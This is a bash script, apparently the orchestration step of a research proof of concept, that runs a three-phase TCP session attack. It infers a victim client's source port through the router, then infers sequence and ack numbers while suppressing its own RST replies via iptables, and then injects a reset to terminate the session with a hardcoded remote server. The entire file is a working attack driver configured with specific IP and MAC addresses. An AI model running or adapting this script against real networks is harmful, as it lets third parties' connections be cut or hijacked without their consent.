# !/bin/bash
ATTACKER_PRIVATE_IP=192.168.1.144; 
REMOTE_SERVER_IP=43.159.39.110; 
REMOTE_SERVER_PORT=1000; 
ROUTER_WAN_IP=166.111.238.1; 
PACKET_IFACE="en0"; 
SELF_MAC_ADDRESS="42:f8:3a:22:c0:e4"
ROUTER_MAC_ADDRESS="a4:39:b3:74:b0:65";
PORT_SEARCH_RANGE=1000;

sudo iptables -F
printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 1 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"


echo `date`
echo "determining if client is talking to ${REMOTE_SERVER_IP}:${REMOTE_SERVER_PORT} on any port.."

cd ../1-infer_port

sudo ./tcp_port_infer ${ATTACKER_PRIVATE_IP} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${ROUTER_WAN_IP} ${PACKET_IFACE} ${SELF_MAC_ADDRESS} ${ROUTER_MAC_ADDRESS} ${PORT_SEARCH_RANGE}

PORT_INFER_RESULT=$(cat ../complete_attack/PORT_INFER_RESULT)
GUESSED_CLIENT_PORT=$(echo "$PORT_INFER_RESULT" |grep -o "source-port: .*"| awk -F": " '{print $2}'|head -n 1)

echo "phase 1 port result: ${GUESSED_CLIENT_PORT}"
echo `date`

sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
# sleep 120s


printf "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 2~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 2 to infer sequence and ack numbers needed to inject.."
cd ../2-infer_seq

sudo ./seq_infer ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${ROUTER_WAN_IP} ${PACKET_IFACE} ${SELF_MAC_ADDRESS} ${ROUTER_MAC_ADDRESS}
SEQ_ACK_RESULT=$(cat ../complete_attack/SEQ_ACK_RESULT)
SEQ=$(echo "$SEQ_ACK_RESULT" |grep -o "seq: .*"| awk -F": " '{print $2}'|head -n 1)
# echo $SEQ
ACK=$(echo "$SEQ_ACK_RESULT" |grep -o "ack: .*"| awk -F": " '{print $2}'|head -n 1)
echo `date`
sleep 3s
sudo iptables -F


printf "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 3~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 3 to terminate the TCP session."


cd ../3-hijack_session
sudo python3 rst_session.py ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${SEQ} ${ACK} ${PACKET_IFACE}

echo `date`



